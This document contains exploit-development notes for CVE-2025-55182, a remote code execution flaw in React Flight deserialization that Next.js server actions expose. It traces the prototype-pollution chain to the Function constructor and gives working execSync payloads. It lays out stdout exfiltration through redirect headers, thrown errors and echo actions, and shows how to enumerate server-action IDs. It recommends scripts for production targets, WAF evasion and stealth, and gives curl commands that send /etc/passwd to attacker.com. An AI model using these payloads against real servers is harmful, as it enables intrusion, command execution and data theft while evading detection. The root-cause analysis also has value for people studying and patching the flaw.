# CVE-2025-55182 Exploit Analysis Notes

## Source Code Locations

### React (v19.2.0)
- **Flight Reply Server** (KEY): `deps/react/packages/react-server/src/ReactFlightReplyServer.js`
- **Flight Client Core**: `deps/react/packages/react-client/src/ReactFlightClient.js`
- **Server DOM Node**: `deps/react/packages/react-server-dom-webpack/src/server/ReactFlightDOMServerNode.js`

### Next.js (v16.0.6)
- **Action Handler**: `deps/next.js/packages/next/src/server/app-render/action-handler.ts`

---

## The Vulnerability

### Root Cause: Missing `hasOwnProperty` Check

**File**: `ReactFlightReplyServer.js`

**The Irony**: Line 35 imports `hasOwnProperty`:
```javascript
import hasOwnProperty from 'shared/hasOwnProperty';
```

**But it's NOT used** in `getOutlinedModel()` at line 614-616:
```javascript
// getOutlinedModel() - lines 595-638
for (let i = 1; i < path.length; i++) {
  value = value[path[i]];  // NO hasOwnProperty CHECK!
}
```

This allows prototype chain traversal via references like `$1:__proto__:then`.

### Status Constants (Line 51-56)

```javascript
const PENDING = 'pending';
const BLOCKED = 'blocked';
const CYCLIC = 'cyclic';
const RESOLVED_MODEL = 'resolved_model';  // Our fake chunk uses this!
const INITIALIZED = 'fulfilled';
const ERRORED = 'rejected';
```

**Key**: Status values are **strings**, so our payload's `"status": "resolved_model"` matches exactly.

---

## Complete Attack Chain (VERIFIED)

### Phase 1: Request Processing

| Step | Location | What Happens |
|------|----------|--------------|
| 1 | `action-handler.ts:867-892` | POST with `Next-Action: x` triggers multipart handling |
| 2 | `action-handler.ts:871-877` | Busboy instance created |
| 3 | `ReactFlightDOMServerNode.js:554-612` | `decodeReplyFromBusboy()` called |
| 4 | `ReactFlightDOMServerNode.js:566-574` | Fields "0" and "1" parsed via busboy `field` event |
| 5 | `ReactFlightReplyServer.js:1110-1127` | `resolveField()` appends to `response._formData` |

### Phase 2: Root Chunk Resolution

| Step | Location | What Happens |
|------|----------|--------------|
| 6 | `ReactFlightReplyServer.js:177-180` | `getRoot(response)` returns chunk 0 |
| 7 | `action-handler.ts:888` | `boundActionArguments = await decodeReplyFromBusboy(...)` |
| 8 | JS Engine | `await` calls `chunk0.then(resolve, reject)` |
| 9 | `ReactFlightReplyServer.js:127-165` | `Chunk.prototype.then` executes |
| 10 | `ReactFlightReplyServer.js:136-138` | `chunk.status === 'resolved_model'` → `initializeModelChunk(chunk)` |

### Phase 3: First JSON Parse (Outer Payload)

| Step | Location | What Happens |
|------|----------|--------------|
| 11 | `ReactFlightReplyServer.js:446-501` | `initializeModelChunk()` runs |
| 12 | `ReactFlightReplyServer.js:466` | `JSON.parse(resolvedModel)` parses our payload |
| 13 | `ReactFlightReplyServer.js:468-474` | `reviveModel(chunk._response, ...)` called |
| 14 | `ReactFlightReplyServer.js:386-442` | `reviveModel()` recursively processes values |
| 15 | `ReactFlightReplyServer.js:395` | String values call `parseModelString()` |

### Phase 4: Reference Resolution (Prototype Pollution)

| Step | Location | What Happens |
|------|----------|--------------|
| 16 | `ReactFlightReplyServer.js:916-1089` | `parseModelString()` handles `$` prefixes |
| 17 | `ReactFlightReplyServer.js:1085-1086` | `$1:__proto__:then` → `getOutlinedModel(response, "1:__proto__:then", ...)` |
| 18 | `ReactFlightReplyServer.js:602-604` | `path = ["1", "__proto__", "then"]`, `id = 1` |
| 19 | `ReactFlightReplyServer.js:518-540` | `getChunk(response, 1)` returns chunk 1 |
| 20 | `ReactFlightReplyServer.js:525-528` | Chunk 1's value `"$@0"` was already in `_formData` |
| 21 | `ReactFlightReplyServer.js:929-933` | `$@0` in parseModelString → returns chunk 0 object directly |
| 22 | `ReactFlightReplyServer.js:614-616` | Loop traverses: `chunk0.__proto__.then` = `Chunk.prototype.then` |

### Phase 5: Promise Thenable Resolution (CRITICAL)

| Step | Location | What Happens |
|------|----------|--------------|
| 23 | `ReactFlightReplyServer.js:487-488` | Outer chunk becomes `INITIALIZED`, `value = ourFakeObject` |
| 24 | `ReactFlightReplyServer.js:142-143` | `resolve(chunk.value)` called with our fake object |
| 25 | **JS Promise Spec** | **`resolve(thenable)` calls `thenable.then(resolve, reject)`** |
| 26 | `ReactFlightReplyServer.js:127` | `Chunk.prototype.then` called with `this = ourFakeObject` |
| 27 | `ReactFlightReplyServer.js:136-138` | `ourFakeObject.status === 'resolved_model'` → `initializeModelChunk(ourFakeObject)` |

### Phase 6: Second JSON Parse (Inner Payload)

| Step | Location | What Happens |
|------|----------|--------------|
| 28 | `ReactFlightReplyServer.js:468-469` | `reviveModel(chunk._response, ...)` uses **`ourFakeObject._response`**! |
| 29 | `ReactFlightReplyServer.js:466` | `JSON.parse('{"then":"$B0"}')` |
| 30 | `ReactFlightReplyServer.js:1059-1068` | `$B0` triggers blob case |
| 31 | `ReactFlightReplyServer.js:1061-1063` | `id = 0`, `prefix = _response._prefix`, `blobKey = prefix + "0"` |
| 32 | `ReactFlightReplyServer.js:1066` | **`response._formData.get(blobKey)` = `Function(codeString + "0")`** |

### Phase 7: Code Execution

| Step | Location | What Happens |
|------|----------|--------------|
| 33 | Line 1066 | `Function("process.mainModule.require('child_process').execSync('CMD');0")` returns Function |
| 34 | `ReactFlightReplyServer.js:487-488` | Inner chunk `INITIALIZED`, `value = {then: Function}` |
| 35 | `ReactFlightReplyServer.js:143` | `resolve({then: Function})` |
| 36 | **JS Promise Spec** | `resolve(thenable)` calls `Function(resolve, reject)` |
| 37 | **EXECUTION** | Function body runs: `execSync('CMD')` → **RCE!** |
| 38 | **HANG** | Function returns `0`, never calls `resolve()` or `reject()` |

---

## Why It Hangs (SOLVED)

### The Promise Thenable Protocol

When JavaScript's `Promise.resolve()` (or a resolve callback) receives a thenable:

```javascript
resolve({ then: someFunction });
// JS spec requires calling: someFunction(promiseResolve, promiseReject)
```

### Our Exploit's Function

```javascript
Function("process.mainModule.require('child_process').execSync('CMD');0")
```

When called as `fn(resolve, reject)`:
1. Function body executes → `execSync('CMD')` runs ✓
2. Function evaluates to `0` and returns
3. **Neither `resolve` nor `reject` is ever called**
4. Promise remains PENDING forever
5. `await` hangs indefinitely

### Why HTTP 200 With Open Stream

- Next.js starts response before awaiting decode (chunked transfer encoding)
- The await at line 888 never completes
- Response stream stays open, client hangs

---

## Getting stdout Back (VERIFIED)

We've tested multiple approaches for capturing command output instead of hanging.

### Approach Comparison

| Approach | Payload Suffix | HTTP Code | stdout Captured | Requirements |
|----------|---------------|-----------|-----------------|--------------|
| **Hang** | `execSync('CMD');0` | 200 (hangs) | No | None (fire-and-forget) |
| **Throw** | `throw execSync('CMD').toString();` | **500** | **Yes** (body) | None |
| **Redirect** | `throw {digest:'NEXT_REDIRECT;push;http://x/'+b64+';307;'}` | **303** | **Yes** (header) | None |
| **Resolve** | `arguments[0]([]);` | 200 | No | Valid action ID |
| **Reflect** | `arguments[0]([execSync('CMD').toString()]);` | **200** | **Yes** (body) | Valid action ID + echo-style action |

### Throw Approach (VERIFIED - WORKING)

**Payload:**
```javascript
throw process.mainModule.require('child_process').execSync('CMD').toString();
```

**Execution Flow:**
1. Function throws with command output as error value
2. `fn(resolve, reject)` throwing = Promise rejection with thrown value
3. Rejection propagates up the await chain
4. `action-handler.ts:1054` catches error
5. `action-handler.ts:1124-1145` serializes error into Flight response
6. HTTP 500 returned with error containing command output

**Response Format:**
```
:N1764925396233.9255
0:{"a":"$@1","f":"","b":"development"}
1:D{"time":0.2127080000936985}
1:E{"digest":"3520165031","name":"Error","message":"<COMMAND OUTPUT HERE>","stack":[],"env":"Server","owner":null}
```

**Key:** Command output appears in the `message` field of the `1:E{...}` error line.

**Script:** `exploit-throw.sh` implements this approach.

### Resolve Approach (VERIFIED - WORKING)

The resolve approach requires a valid action ID. With an invalid ID, the action lookup fails with 404. With a valid ID, the action executes and returns HTTP 200.

**Payload (no data return):**
```javascript
arguments[0]([]);
```

**Execution Flow:**
1. `arguments[0]` is the Promise resolve callback
2. Calling `resolve([])` settles the Promise with empty array as action arguments
3. `await decodeReplyFromBusboy(...)` completes successfully
4. Code proceeds to action lookup at `action-handler.ts:1009-1014`
5. With valid action ID → action found and invoked with `[]` as args
6. Action returns → HTTP 200 with RSC response

**Result:** Clean HTTP 200, no hanging connection, but no data exfiltration.

### Reflect Approach (VERIFIED - WORKING)

Combines the resolve approach with a server action that echoes its input, enabling HTTP 200 with data exfiltration.

**Payload:**
```javascript
arguments[0]([process.mainModule.require('child_process').execSync('CMD').toString()]);
```

**Requirements:**
1. Valid action ID (discoverable - see Action ID Discovery below)
2. Action that returns its input (e.g., `reflect(data) → {data}`)

**Execution Flow:**
1. `arguments[0]([output])` resolves with command output as first action argument
2. Action is invoked: `reflect("uid=501(free)...")`
3. Action returns: `{data: "uid=501(free)..."}`
4. HTTP 200 with output in RSC response body

**Example Response:**
```
:N1764928420317.0688
0:{"a":"$@1","f":"","b":"development"}
1:D{"time":0.41833300003781915}
1:{"data":"uid=501(free) gid=20(staff)..."}

HTTP_CODE: 200
```

**Real-World Applicability:** Many apps have actions that echo/log/process input:
- Debug endpoints
- Logging actions
- Search/filter that returns query
- Validation endpoints that echo input

---

## Action ID Discovery (Black-Box Reconnaissance)

Server Action IDs are **publicly exposed** in Next.js applications. An external attacker can enumerate them without authentication.

### Discovery Methods

#### 1. HTML Hidden Fields (Easiest)

Action IDs are embedded in forms as hidden inputs:

```bash
curl -s https://target.com/ | grep -oE '\$ACTION_ID_[a-f0-9]+' | sort -u
```

**Output:**
```
$ACTION_ID_00471125f2479dd5e24cd579742b6cc225ed4803b4
$ACTION_ID_406231a544604159322f14e5a68d20303bc1e9635b
$ACTION_ID_4099afe357e9fcef7db584eb203d4fdc1c14019dab
```

#### 2. RSC Flight Payload

Action metadata appears in `<script>` tags with the Flight protocol:

```bash
curl -s https://target.com/ | grep -o '{"id":"[^"]*","bound":[^}]*}'
```

**Output (dev mode includes file paths!):**
```json
{"id":"00471125f2479dd5e24cd579742b6cc225ed4803b4","bound":null,"name":"action","env":"Server","location":["module evaluation","/app/actions.ts",70,452]}
```

#### 3. JavaScript Bundles

In production builds, action IDs may appear in JS chunks.

### Action ID Format

- **Length:** 40 hexadecimal characters
- **Format:** Hash of action function + module path
- **Stability:** Changes when action code/location changes

### Exploit Implications

| Finding | Implication |
|---------|-------------|
| Action IDs are public | No secret needed for exploitation |
| Exploit uses dummy "x" | Basic RCE doesn't need real ID |
| Real IDs enable 200 response | Stealth exfil requires ID + matching action |
| Dev mode leaks paths | Reveals internal file structure |

**Key Insight:** The CVE-2025-55182 RCE triggers during deserialization, **before** action ID validation. Any `Next-Action` header value (even "x") triggers the vulnerable code path.

---

## Key Data Structures

### Response Object (`ReactFlightReplyServer.js:1091-1108`)

```javascript
export function createResponse(
  bundlerConfig: ServerManifest,
  formFieldPrefix: string,
  temporaryReferences: void | TemporaryReferenceSet,
  backingFormData?: FormData = new FormData(),
): Response {
  const chunks: Map<number, SomeChunk<any>> = new Map();
  const response: Response = {
    _bundlerConfig: bundlerConfig,
    _prefix: formFieldPrefix,      // Empty string normally, code in exploit
    _formData: backingFormData,    // FormData object, Function ctor in exploit
    _chunks: chunks,
    _closed: false,
    _closedReason: null,
    _temporaryReferences: temporaryReferences,
  };
  return response;
}
```

### Chunk Object (`ReactFlightReplyServer.js:118-123`)

```javascript
function Chunk(status, value, reason, response) {
  this.status = status;    // String: 'pending', 'resolved_model', 'fulfilled', etc.
  this.value = value;      // The chunk's content (JSON string or parsed value)
  this.reason = reason;    // Chunk ID or error
  this._response = response;  // Reference to Response object
}
```

### Payload → Object Mapping

| Payload Property | Maps To | Exploit Value |
|------------------|---------|---------------|
| `"then"` | `.then` method | `$1:__proto__:then` → `Chunk.prototype.then` |
| `"status"` | `.status` | `"resolved_model"` (triggers initializeModelChunk) |
| `"value"` | `.value` | `"{\"then\":\"$B0\"}"` (inner JSON to parse) |
| `"reason"` | `.reason` | `-1` (bypasses toString at line 453) |
| `"_response"` | `._response` | Fake Response object |
| `"_response._prefix"` | `._response._prefix` | Code string |
| `"_response._formData.get"` | `._response._formData.get` | `$1:constructor:constructor` → `Function` |

---

## File Reference Table

### ReactFlightReplyServer.js (Primary)

| Lines | Function/Section | Purpose |
|-------|------------------|---------|
| 35 | `import hasOwnProperty` | Imported but **NOT USED** (the bug!) |
| 51-56 | Status constants | `PENDING`, `RESOLVED_MODEL`, `INITIALIZED`, etc. |
| 118-123 | `Chunk()` constructor | Creates chunk objects |
| 125-126 | `Chunk.prototype` setup | Subclasses `Promise.prototype` |
| 127-165 | `Chunk.prototype.then` | Thenable handling - triggers `initializeModelChunk` |
| 142-143 | `resolve(chunk.value)` | **Critical**: Triggers thenable resolution chain |
| 177-180 | `getRoot()` | Returns chunk 0 as root Thenable |
| 182-185 | `createPendingChunk()` | Creates new pending chunks |
| 251-258 | `createResolvedModelChunk()` | Creates chunks with RESOLVED_MODEL status |
| 386-442 | `reviveModel()` | Recursively processes JSON, calls `parseModelString` |
| 446-501 | `initializeModelChunk()` | Parses chunk value, **uses `chunk._response`** (line 469) |
| 518-540 | `getChunk()` | Gets/creates chunk by ID, checks `_formData` |
| 595-638 | `getOutlinedModel()` | **VULNERABLE**: Path traversal without `hasOwnProperty` |
| 614-616 | Vulnerable loop | `value = value[path[i]]` - no prototype check |
| 916-1089 | `parseModelString()` | Handles `$` prefixes (`$@`, `$B`, `$1:...`) |
| 929-933 | Case `@` | Raw chunk reference - returns chunk object |
| 1059-1068 | Case `B` | **Blob handling - calls `_formData.get(_prefix + id)`** |
| 1066 | The trigger | `response._formData.get(blobKey)` → `Function(code)` |
| 1085-1086 | Default case | Model references → `getOutlinedModel()` |
| 1091-1108 | `createResponse()` | Response object structure |
| 1110-1127 | `resolveField()` | Appends fields to `_formData` |

### ReactFlightDOMServerNode.js

| Lines | Function | Purpose |
|-------|----------|---------|
| 554-612 | `decodeReplyFromBusboy()` | Entry point from Next.js |
| 559-563 | `createResponse()` call | Creates response with empty `_prefix` |
| 566-574 | `busboyStream.on('field')` | Calls `resolveField()` for each part |
| 601-603 | `busboyStream.on('finish')` | Calls `close(response)` |
| 611 | `return getRoot(response)` | Returns root Thenable to Next.js |

### action-handler.ts (Next.js)

| Lines | Section | Purpose |
|-------|---------|---------|
| 867-892 | Multipart handling | Busboy setup and decode call |
| 888 | **The await** | `boundActionArguments = await decodeReplyFromBusboy(...)` |
| 1009-1014 | Action lookup | Would fail (but never reached due to hang) |
| 1054-1149 | Error handling | Catches errors, serializes to Flight response |
| 1124-1125 | Error response | `res.statusCode = 500` |
| 1139-1145 | Flight serialization | `generateFlight(..., {actionResult: Promise.reject(err)})` |

---

## Open Questions

### stdout Capture Edge Cases

1. **Large output handling**: What's the maximum size for error messages?
   - Is output truncated at some point?
   - Test with commands like `cat /etc/passwd` or `ls -la /`
   - Redirect header approach limited to ~8KB (HTTP header limit)

2. **Binary output**: What happens with non-UTF8 output?
   - Does `.toString()` handle binary gracefully?
   - Test with `cat /bin/ls | head -c 100`

3. **Special characters**: Are certain characters escaped or stripped?
   - Newlines work (verified)
   - What about quotes, backslashes, null bytes?

### Architecture Questions

4. **Edge runtime**: Does the vulnerability exist in Edge deployments?
   - Different Flight implementation?
   - No `process.mainModule` available
   - Different RCE primitive needed?

5. ~~**Other entry points**: Are there paths besides multipart POST?~~ **ANSWERED**
   - URL-encoded path exists but validates action ID BEFORE deserialization
   - Plain text path NOT viable (single field limitation)
   - Multipart remains the only no-prerequisites path

6. ~~**Production vs Development**: Does behavior differ?~~ **ANSWERED**
    - **Redirect mode**: Works in production (digest not sanitized)
    - **Throw mode**: BROKEN in production (error message stripped to `{digest}` only)
    - **Blind mode**: Works in production
    - **Reflect mode**: Works in production (normal model values not sanitized)

### Stealth Considerations

7. **Action signature matching**: Can we generically match any action's expected args?
   - FormData actions are common
   - Could we craft FormData-like objects?

8. ~~**Response body inspection**: Does the reflect approach work with any echo-style action?~~ **PARTIALLY ANSWERED**
   - Reflect mode works but requires action that returns its input
   - Test server wrappers use `console.log()` without returning → `$undefined` in response
   - Real-world targets with search/validate/log actions would return command output
   - Common patterns: search endpoints, validation endpoints, debug endpoints

---

## Verified Execution Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│ POST / HTTP/1.1                                                      │
│ Next-Action: x                                                       │
│ Content-Type: multipart/form-data                                    │
│ Part 0: {"then":"$1:__proto__:then","status":"resolved_model",...}  │
│ Part 1: "$@0"                                                        │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ action-handler.ts:888                                                │
│ boundActionArguments = await decodeReplyFromBusboy(busboy, ...)     │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ ReactFlightDOMServerNode.js:611                                      │
│ return getRoot(response)  →  chunk0                                  │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ JS: await chunk0  →  chunk0.then(resolve, reject)                    │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ ReactFlightReplyServer.js:127-165                                    │
│ Chunk.prototype.then:                                                │
│   status === 'resolved_model' → initializeModelChunk(chunk0)        │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ ReactFlightReplyServer.js:446-501                                    │
│ initializeModelChunk:                                                │
│   JSON.parse(chunk0.value) → rawModel                                │
│   reviveModel(chunk0._response, rawModel) → parseModelString()      │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ ReactFlightReplyServer.js:1085-1086, 595-638                         │
│ "$1:__proto__:then" → getOutlinedModel()                             │
│   path = ["1", "__proto__", "then"]                                  │
│   chunk1.value via $@0 = chunk0 object                               │
│   chunk0.__proto__.then = Chunk.prototype.then                       │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ ReactFlightReplyServer.js:487-488, 142-143                           │
│ chunk0.status = INITIALIZED                                          │
│ chunk0.value = {then: Chunk.prototype.then, status: "resolved_.."}  │
│ resolve(chunk0.value)  ← TRIGGERS THENABLE RESOLUTION               │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ JS Promise Spec:                                                     │
│ resolve(thenable) → thenable.then(promiseResolve, promiseReject)    │
│ fakeChunk.then(resolve2, reject2)                                    │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ ReactFlightReplyServer.js:127-165 (SECOND TIME)                      │
│ Chunk.prototype.then with this = fakeChunk:                          │
│   fakeChunk.status === 'resolved_model'                              │
│   initializeModelChunk(fakeChunk)                                    │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ ReactFlightReplyServer.js:468-469                                    │
│ reviveModel(fakeChunk._response, '{"then":"$B0"}')                   │
│          ↑ ATTACKER-CONTROLLED RESPONSE OBJECT!                      │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ ReactFlightReplyServer.js:1059-1068                                  │
│ case 'B':  // $B0                                                    │
│   prefix = response._prefix        // "execSync code..."             │
│   blobKey = prefix + "0"           // "execSync code...0"            │
│   response._formData.get(blobKey)  // Function("execSync code...0") │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ $1:constructor:constructor resolves to Function constructor          │
│ Function("process.mainModule.require('child_process')...;0")        │
│ Returns: anonymous function with that body                           │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Inner chunk initialized:                                             │
│ value = {then: [Function]}                                           │
│ resolve({then: [Function]})                                          │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ JS Promise Spec (AGAIN):                                             │
│ resolve({then: fn}) → fn(resolve3, reject3)                          │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Function body executes:                                              │
│   process.mainModule.require('child_process').execSync('CMD')       │
│   0  // returns this value                                           │
│                                                                      │
│ ⚠️  resolve3() and reject3() ARE NEVER CALLED                        │
│ ⚠️  Promise stays PENDING forever                                    │
│ ⚠️  await at action-handler.ts:888 HANGS                             │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Redirect Exfiltration Mechanism (HTTP 303)

### Discovery

Next.js has special handling for `NEXT_REDIRECT` errors in `action-handler.ts`. By throwing an error that passes `isRedirectError()` validation, we can exfiltrate data via the `x-action-redirect` response header instead of the error body.

### Key Code Paths

**Redirect error validation** (`redirect-error.ts:21-45`):
```typescript
export function isRedirectError(error: unknown): error is RedirectError {
  // ...
  const digest = error.digest.split(';')
  const [errorCode, type] = digest
  const destination = digest.slice(2, -2).join(';')  // URL can contain semicolons!
  const status = digest.at(-2)

  return (
    errorCode === REDIRECT_ERROR_CODE &&    // "NEXT_REDIRECT"
    (type === 'replace' || type === 'push') &&
    typeof destination === 'string' &&
    !isNaN(statusCode) &&
    statusCode in RedirectStatusCode        // 303, 307, or 308
  )
}
```

**Header injection** (`action-handler.ts:310`):
```typescript
res.setHeader('x-action-redirect', `${redirectUrl};${redirectType}`)
```

This line executes **before** URL validation at line 317+. If our "URL" isn't parseable, the error is caught but the header is already set.

### The URL Wrapper Trick

Raw base64 output fails `new URL()` parsing, causing HTTP 500. Solution: wrap output as valid URL.

**Payload:**
```javascript
var o = Buffer.from(
  process.mainModule.require('child_process').execSync('CMD')
).toString('base64');
var e = new Error();
e.digest = 'NEXT_REDIRECT;push;http://x/' + o + ';307;';
throw e;
```

**Result:**
- `isRedirectError()` passes (valid digest format)
- `getURLFromRedirectError()` returns `http://x/{base64}`
- `x-action-redirect` header set to `http://x/{base64};push`
- `new URL('http://x/{base64}')` succeeds
- HTTP 303 response with output in header

### Extraction

```bash
# Header format: x-action-redirect: http://x/{base64};push
curl -s -D - ... | grep "x-action-redirect" | sed 's/.*http:\/\/x\///' | sed 's/;push.*//' | base64 -d
```

### Comparison with Throw Mode

| Aspect | Redirect (HTTP 303) | Throw (HTTP 500) |
|--------|---------------------|------------------|
| stdout location | `x-action-redirect` header | Body `message` field |
| Log visibility | Redirect logs | Error logs (noisier) |
| Output encoding | Base64 (header-safe) | JSON-escaped |
| Detection signature | Different from typical errors | Looks like app error |

---

## Completed

### Core Exploit Development
- [x] **Test `throw` approach** - WORKS. Returns HTTP 500 with stdout in error message.
- [x] **Test `arguments[0]` approach** - WORKS. Resolves Promise, action lookup succeeds with valid ID.
- [x] **Test redirect approach** - WORKS. Returns HTTP 303 with stdout in header.
- [x] **Test HTTP 200 + data exfil** - WORKS. Valid action ID + echo-style action returns stdout in 200 body.
- [x] **Action ID discovery** - VERIFIED. IDs exposed in HTML hidden fields and RSC payload.

### Exploit Scripts Created
- [x] **`exploit-redirect.sh`** - Redirect-based exfil (HTTP 303) - **RECOMMENDED**
- [x] **`exploit-throw.sh`** - Throw-based exfil (HTTP 500) - dev mode only
- [x] **`exploit-blind.sh`** - Blind RCE (HTTP 200 hangs) - renamed from `exploit.sh`
- [x] **`exploit-urlencoded.sh`** - URL-encoded variant (requires action ID)
- [x] **`exploit-reflect.sh`** - HTTP 200 stealth exfil (requires action ID + echo action)
- [x] **`enumerate-actions.sh`** - Action ID discovery from target HTML

### Research Completed
- [x] **URL-encoded path limitation** - Validates action ID BEFORE deserialization (unlike multipart)
- [x] **Production mode testing** - Redirect works, throw broken (error sanitization)
- [x] **Reflect mode limitation** - Requires action that returns its input for data exfil
- [x] **Added test server actions** - `ping()`, `echo()`, `submitForm()`, `reflect()` for testing.

## Production Mode Behavior Analysis

### Error Sanitization in Production

React's Flight protocol strips error details in production at two levels:

**Server-Side** (`ReactFlightServer.js:4131-4165`):
```javascript
function emitErrorChunk(...) {
  let errorInfo;
  if (__DEV__) {
    // DEV: Full error details
    errorInfo = {digest, name, message, stack, env, owner};
  } else {
    // PROD: Only digest!
    errorInfo = {digest};
  }
  // ...serialize errorInfo...
}
```

**Client-Side** (`ReactFlightClient.js:3290-3305`):
```javascript
function resolveErrorProd(response) {
  const error = new Error(
    'An error occurred in the Server Components render. ' +
    'The specific message is omitted in production builds...'
  );
  error.stack = 'Error: ' + error.message;
  return error;  // Original message is LOST
}
```

### Why Redirect Mode Survives Production

The `x-action-redirect` header is set **unconditionally** at `action-handler.ts:310`:

```typescript
async function createRedirectRenderResult(...) {
  res.setHeader('x-action-redirect', `${redirectUrl};${redirectType}`)
  // URL validation happens AFTER this (line 317+)
}
```

Key insight: The redirect URL comes from the error's `digest` property, NOT the `message`:
1. NEXT_REDIRECT errors use digest format: `NEXT_REDIRECT;{type};{url};{statusCode};`
2. `getURLFromRedirectError()` extracts URL by parsing the digest string
3. The digest is metadata, not subject to production sanitization

### Why Reflect Mode Works in Production

When an action returns successfully (not throwing), the return value is serialized as a normal Flight model. String serialization has no production-mode stripping:

```javascript
if (typeof value === 'string') {
  // Only taint checking, no __DEV__ stripping
  if (enableTaint) {
    const tainted = TaintRegistryValues.get(value);
    if (tainted !== undefined) {
      throwTaintViolation(tainted.message);
    }
  }
  // String passes through as-is
}
```

**Source:** `ReactFlightServer.js:3779-3784`

---

## Exfiltration Method Selection Guide

### Production Compatibility Matrix

| Exploit | HTTP | Action ID | Dev Mode | Production | Reason |
|---------|------|-----------|----------|------------|--------|
| `exploit-redirect.sh` | 303 | No | **Works** | **Works** | Header set unconditionally, URL in digest not stripped |
| `exploit-throw.sh` | 500 | No | **Works** | **BROKEN** | Error message never sent (`{digest}` only in prod) |
| `exploit-blind.sh` | 200 | No | **Works** | **Works** | No output exfiltration needed |
| `exploit-urlencoded.sh` | 303 | **Yes** | **Works** | **Works** | Same as redirect, different WAF signature |
| `exploit-reflect.sh` | 200 | **Yes** | **Works** | **Works** | Normal model value, not an error |

### Scenario-Based Selection

| Scenario | Recommended Method | Why |
|----------|-------------------|-----|
| Production target, any | **Redirect** (303) | Only reliable stdout capture in prod, no prereqs |
| Development/testing | **Throw** (500) | Simple, clean output in response body |
| Maximum stealth | **Reflect** (200) | Looks like normal action traffic (requires action ID) |
| WAF blocking multipart | **URL-encoded** (303) | Different signature, requires action ID |
| Fire-and-forget | **Blind** (200) | No response needed, just execute |
| Behind strict WAF | **Blind** + OOB | Use `curl attacker.com/$(base64 output)` |

### Production Exploitation Strategy

**Recommended:** Redirect Mode (No Prerequisites)
```bash
./exploit-redirect.sh https://target.com "id"
```
- No prerequisites (uses dummy action ID "x")
- Works in production
- Output in `x-action-redirect` header (base64 encoded)
- HTTP 303 response

**WAF Evasion:** URL-Encoded Mode (Requires Action ID)
```bash
./enumerate-actions.sh https://target.com           # Find action IDs
./exploit-urlencoded.sh https://target.com "ACTION_ID" "id"
```
- Different WAF signature (no multipart boundaries)
- Requires valid action ID from enumeration
- Same output mechanism as redirect (HTTP 303)

**Stealth Option:** Reflect Mode (Requires Action ID + Echo Action)
```bash
./enumerate-actions.sh https://target.com           # Find action IDs
./exploit-reflect.sh https://target.com "ACTION_ID" "id"
```
- HTTP 200 response (looks like normal traffic)
- Output in RSC response body
- Requires action that returns its input (search, validate, log actions)
- Most reconnaissance required

**Blind Execution:**
```bash
./exploit-blind.sh https://target.com "curl https://attacker.com/callback"
```
- Always works (no action ID needed)
- Use for out-of-band exfiltration
- No direct output (use DNS/HTTP callback)

---

## Output Size Limits

### Redirect Mode (x-action-redirect Header)

The redirect exploit exfiltrates data via the `x-action-redirect` HTTP header. Header size limits vary by infrastructure layer.

#### Empirical Testing (Next.js Dev Server)

| Raw Output Size | After Base64 | Result |
|-----------------|--------------|--------|
| ~500 bytes (`id`) | ~700 bytes | **Works** |
| ~2KB | ~2.7KB | **Works** |
| ~16KB | ~21KB | **Works** |
| ~57KB (`ls -la /usr/bin`) | ~76KB | **Works** |
| ~74KB (`ls -la /usr/bin /usr/sbin`) | ~99KB | **Works** |
| ~5.4MB (`ls -laR /usr`) | ~7.2MB | **FAILS** (SIGTERM) |

**Observed Dev Server Limit:** >100KB header appears to work in development.

#### Real-World Infrastructure Limits

Production environments typically have stricter limits:

| Layer | Default Limit | Notes |
|-------|---------------|-------|
| **Node.js** | 16KB total headers | `--max-http-header-size` flag |
| **nginx** | 4-8KB per header | `large_client_header_buffers` directive |
| **Apache** | 8KB total headers | `LimitRequestFieldSize` directive |
| **AWS ALB** | 16KB total headers | Not configurable |
| **Cloudflare** | 16KB total headers | Enterprise can increase |
| **HAProxy** | 16KB per header | `tune.http.maxhdr` |

**Conservative Production Estimate:**
```
Header budget: ~8KB (safest assumption)
- Header name + overhead: ~30 bytes
- URL wrapper (http://x/...;push): ~15 bytes
= ~8KB for base64 data
= ~6KB raw command output (after base64 decode)
```

#### Maximizing Output

For larger exfiltration needs:

1. **Compression** - Compress before base64:
   ```bash
   # Payload idea (not yet implemented):
   # gzip output, then base64 → ~3-10x more data in same header space
   ```

2. **Chunking** - Multiple requests for large files:
   ```bash
   ./exploit-redirect.sh target "dd if=/etc/passwd bs=6000 count=1"
   ./exploit-redirect.sh target "dd if=/etc/passwd bs=6000 count=1 skip=1"
   ```

3. **Out-of-band** - For unlimited exfil, use blind mode:
   ```bash
   ./exploit-blind.sh target "curl -X POST -d @/etc/passwd https://attacker.com/exfil"
   ```

### Reflect Mode (RSC Body)

Reflect mode returns output in the HTTP response body, which has much higher limits:

| Layer | Typical Limit |
|-------|---------------|
| HTTP Response Body | Effectively unlimited (streaming) |
| RSC Flight Protocol | No explicit limit |
